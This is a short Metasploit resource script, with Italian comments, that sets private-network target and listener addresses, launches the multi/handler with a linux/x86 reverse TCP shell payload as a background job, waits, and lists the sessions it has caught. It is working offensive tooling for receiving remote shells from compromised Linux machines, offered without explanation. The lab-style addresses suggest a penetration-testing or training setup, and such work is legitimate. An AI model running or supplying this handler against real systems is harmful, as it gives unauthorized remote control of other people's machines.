#TODO leggere parametri da config_rc.json
set RHOSTS 192.168.42.21
set LHOST 192.168.42.23
set LPORT 2345

use exploit/multi/handler
set payload linux/x86/shell_reverse_tcp
exploit -j -z

# Aggiungere una pausa per verificare la creazione delle sessioni
sleep 30

# Controlla le sessioni attive (verifica manualmente o aggiungi un controllo nel modulo Ruby se necessario)
sessions -l


